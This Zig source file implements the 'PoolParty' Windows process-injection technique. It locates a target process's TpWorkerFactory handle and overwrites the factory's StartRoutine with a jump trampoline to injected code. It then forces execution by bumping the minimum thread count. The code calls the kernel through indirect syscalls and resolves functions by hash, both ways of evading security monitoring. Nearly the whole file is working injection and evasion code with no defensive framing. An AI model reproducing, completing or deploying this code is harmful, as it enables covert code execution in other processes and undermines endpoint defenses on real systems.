const std = @import("std");
const api = @import("api.zig");
const crypto = @import("crypto.zig");
const syscalls = @import("syscalls.zig");
const injection = @import("injection.zig");

pub const WorkerFactoryInfo = struct {
    hDupFactory: ?*anyopaque,
    start_routine: usize,
    min_threads: u32,
};

/// Finds a TpWorkerFactory handle in the target process and returns its handle (duplicated)
/// and the address of its StartRoutine.
pub fn findWorkerFactory(
    arena: std.mem.Allocator,
    logFn: *const fn(std.mem.Allocator, []const u8) void,
    target_pid: u32,
    hProcess: ?*anyopaque,
    nt_query_system_info_ssn: u32,
    nt_duplicate_object_ssn: u32,
    nt_query_object_ssn: u32,
    nt_query_worker_factory_ssn: u32,
    syscall_gadget: usize
) !WorkerFactoryInfo {
    var buf_sz: usize = 0x10000;
    // Ensure 16-byte alignment for System Information classes
    var info_buf: []align(16) u8 = try arena.alignedAlloc(u8, @enumFromInt(16), buf_sz);

    var sys_info_len: u32 = 0;
    var info_class = api.SystemExtendedHandleInformation;
    var status = syscalls.doSyscall(nt_query_system_info_ssn, syscall_gadget, &[_]usize{
        info_class,
        @intFromPtr(info_buf.ptr),
        buf_sz,
        @intFromPtr(&sys_info_len),
    });

    if (status == 0xC0000003) { // STATUS_INVALID_INFO_CLASS
        logFn(arena, "PoolParty: SystemExtendedHandleInformation not supported, falling back...");
        info_class = api.SystemHandleInformation;
        status = syscalls.doSyscall(nt_query_system_info_ssn, syscall_gadget, &[_]usize{
            info_class,
            @intFromPtr(info_buf.ptr),
            buf_sz,
            @intFromPtr(&sys_info_len),
        });
    }

    if (status != 0 and status != 0xC0000004) {
        logFn(arena, std.fmt.allocPrint(arena, "PoolParty: NtQuerySystemInformation failed initially with status 0x{x} at addr 0x{x}", .{status, @intFromPtr(info_buf.ptr)}) catch "Log failed");
    }

    while (status == 0xC0000004) { // STATUS_INFO_LENGTH_MISMATCH
        buf_sz = if (sys_info_len > buf_sz) sys_info_len else buf_sz * 2;
        info_buf = try arena.alignedAlloc(u8, @enumFromInt(16), buf_sz);
        status = syscalls.doSyscall(nt_query_system_info_ssn, syscall_gadget, &[_]usize{
            info_class,
            @intFromPtr(info_buf.ptr),
            buf_sz,
            @intFromPtr(&sys_info_len),
        });
    }

    if (status != 0) {
        logFn(arena, std.fmt.allocPrint(arena, "PoolParty: NtQuerySystemInformation failed with status 0x{x}", .{status}) catch "Log failed");
        return error.QuerySystemInfoFailed;
    }

    logFn(arena, std.fmt.allocPrint(arena, "PoolParty: Handle discovery started. Buffer size: {d} bytes, Class: {d}", .{buf_sz, info_class}) catch "Log failed");

    const current_process: ?*anyopaque = @ptrFromInt(std.math.maxInt(usize));

    if (info_class == api.SystemExtendedHandleInformation) {
        const handle_info = @as(*api.SYSTEM_HANDLE_INFORMATION_EX, @ptrCast(@alignCast(info_buf.ptr)));
        const handle_count = handle_info.NumberOfHandles;
        const handles_ptr = @as([*]api.SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, @ptrCast(&handle_info.Handles[0]));

        var i: usize = 0;
        while (i < handle_count) : (i += 1) {
            const entry = handles_ptr[i];
            if (entry.UniqueProcessId == target_pid) {
                if (try checkHandle(arena, logFn, hProcess, @intCast(entry.HandleValue), current_process, nt_duplicate_object_ssn, nt_query_object_ssn, nt_query_worker_factory_ssn, syscall_gadget)) |result| {
                    return result;
                }
            }
        }
    } else {
        const handle_info = @as(*api.SYSTEM_HANDLE_INFORMATION, @ptrCast(@alignCast(info_buf.ptr)));
        const handle_count = handle_info.NumberOfHandles;
        const handles_ptr = @as([*]api.SYSTEM_HANDLE_TABLE_ENTRY_INFO, @ptrCast(&handle_info.Handles[0]));

        var i: usize = 0;
        while (i < handle_count) : (i += 1) {
            const entry = handles_ptr[i];
            if (entry.UniqueProcessId == target_pid) {
                if (try checkHandle(arena, logFn, hProcess, entry.HandleValue, current_process, nt_duplicate_object_ssn, nt_query_object_ssn, nt_query_worker_factory_ssn, syscall_gadget)) |result| {
                    return result;
                }
            }
        }
    }
    return error.WorkerFactoryNotFound;
}

fn checkHandle(
    arena: std.mem.Allocator,
    logFn: *const fn(std.mem.Allocator, []const u8) void,
    hProcess: ?*anyopaque,
    handle_value: u16,
    current_process: ?*anyopaque,
    nt_duplicate_object_ssn: u32,
    nt_query_object_ssn: u32,
    nt_query_worker_factory_ssn: u32,
    syscall_gadget: usize
) !?WorkerFactoryInfo {
    var hDup: ?*anyopaque = null;
    const dup_status = syscalls.doSyscall(nt_duplicate_object_ssn, syscall_gadget, &[_]usize{
        @intFromPtr(hProcess),
        handle_value,
        @intFromPtr(current_process),
        @intFromPtr(&hDup),
        0, 0, api.DUPLICATE_SAME_ACCESS,
    });

    if (dup_status == 0 and hDup != null) {
        var obj_type_len: u32 = 0;
        _ = syscalls.doSyscall(nt_query_object_ssn, syscall_gadget, &[_]usize{ @intFromPtr(hDup), api.ObjectTypeInformation, 0, 0, @intFromPtr(&obj_type_len) });

        if (obj_type_len > 0) {
            const obj_buf: []align(16) u8 = try arena.alignedAlloc(u8, @enumFromInt(16), obj_type_len + 0x100);
            if (syscalls.doSyscall(nt_query_object_ssn, syscall_gadget, &[_]usize{ @intFromPtr(hDup), api.ObjectTypeInformation, @intFromPtr(obj_buf.ptr), obj_buf.len, @intFromPtr(&obj_type_len) }) == 0) {
                const obj_info = @as(*api.PUBLIC_OBJECT_TYPE_INFORMATION, @ptrCast(@alignCast(obj_buf.ptr)));
                const expected_name = [_]u16{ 'T', 'p', 'W', 'o', 'r', 'k', 'e', 'r', 'F', 'a', 'c', 't', 'o', 'r', 'y' };
                if (obj_info.TypeName.Buffer != null and obj_info.TypeName.Length / 2 == expected_name.len) {
                    var match = true;
                    for (expected_name, 0..) |c, idx| { if (obj_info.TypeName.Buffer.?[idx] != c) { match = false; break; } }
                    if (match) {
                        var wf_info = std.mem.zeroes(api.WORKER_FACTORY_BASIC_INFORMATION);
                        var wf_ret_len: u32 = 0;
                        if (syscalls.doSyscall(nt_query_worker_factory_ssn, syscall_gadget, &[_]usize{ @intFromPtr(hDup), api.WorkerFactoryBasicInformation, @intFromPtr(&wf_info), @sizeOf(api.WORKER_FACTORY_BASIC_INFORMATION), @intFromPtr(&wf_ret_len) }) == 0) {
                            logFn(arena, "PoolParty: Found WorkerFactory!");
                            return .{ .hDupFactory = hDup, .start_routine = @intFromPtr(wf_info.StartRoutine), .min_threads = wf_info.ThreadMinimum };
                        }
                    }
                }
            }
        }
        const CloseHandle = @as(*const fn(?*anyopaque) callconv(.winapi) i32, @ptrCast(api.getProcAddressByHash(api.getModuleHandleByHash(comptime @import("crypto.zig").djb2_i("KERNEL32.DLL")).?, comptime @import("crypto.zig").djb2("CloseHandle")).?));
        _ = CloseHandle(hDup);
    }
    return null;
}

pub fn triggerPoolParty(
    arena: std.mem.Allocator,
    logFn: *const fn(std.mem.Allocator, []const u8) void,
    hProcess: ?*anyopaque,
    hDupFactory: ?*anyopaque,
    target_start_routine: usize,
    worker_factory_min_threads: u32,
    remote_exec_addr: usize,
    nt_protect_ssn: u32,
    nt_write_ssn: u32,
    nt_set_worker_factory_ssn: u32,
    syscall_gadget: usize
) !usize {
    logFn(arena, "PoolParty: Crafting trampoline...");
    var trampoline = [_]u8{ 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0 }; // mov rax, <addr>; jmp rax
    std.mem.writeInt(u64, trampoline[2..10], remote_exec_addr, .little);

    logFn(arena, "PoolParty: Stomping StartRoutine with trampoline...");
    var old_protect: u32 = 0;
    var protect_addr = target_start_routine;
    var protect_size: usize = trampoline.len;
    
    const status_prot = syscalls.doSyscall(nt_protect_ssn, syscall_gadget, &[_]usize{ @intFromPtr(hProcess), @intFromPtr(&protect_addr), @intFromPtr(&protect_size), api.PAGE_EXECUTE_READWRITE, @intFromPtr(&old_protect) });
    if (status_prot != 0) {
        logFn(arena, std.fmt.allocPrint(arena, "PoolParty: Error: NtProtectVirtualMemory (RWX) failed with status 0x{x}", .{status_prot}) catch "Prot fail");
        return error.ProtectFailed;
    }

    var written: usize = 0;
    const status_write = syscalls.doSyscall(nt_write_ssn, syscall_gadget, &[_]usize{ @intFromPtr(hProcess), target_start_routine, @intFromPtr(&trampoline), trampoline.len, @intFromPtr(&written) });
    if (status_write != 0) {
        logFn(arena, std.fmt.allocPrint(arena, "PoolParty: Error: NtWriteVirtualMemory failed with status 0x{x}", .{status_write}) catch "Write fail");
        return error.WriteFailed;
    }

    _ = syscalls.doSyscall(nt_protect_ssn, syscall_gadget, &[_]usize{ @intFromPtr(hProcess), @intFromPtr(&protect_addr), @intFromPtr(&protect_size), old_protect, @intFromPtr(&old_protect) });

    logFn(arena, "PoolParty: Triggering via ThreadMinimum increment...");
    var thread_min = worker_factory_min_threads + 1;
    const status_trigger = syscalls.doSyscall(nt_set_worker_factory_ssn, syscall_gadget, &[_]usize{ @intFromPtr(hDupFactory), api.WorkerFactoryThreadMinimum, @intFromPtr(&thread_min), @sizeOf(u32) });
    if (status_trigger != 0) {
        logFn(arena, std.fmt.allocPrint(arena, "PoolParty: Error: NtSetInformationWorkerFactory failed with status 0x{x}", .{status_trigger}) catch "Trigger fail");
        return error.SetWorkerFactoryFailed;
    }

    return 0;
}
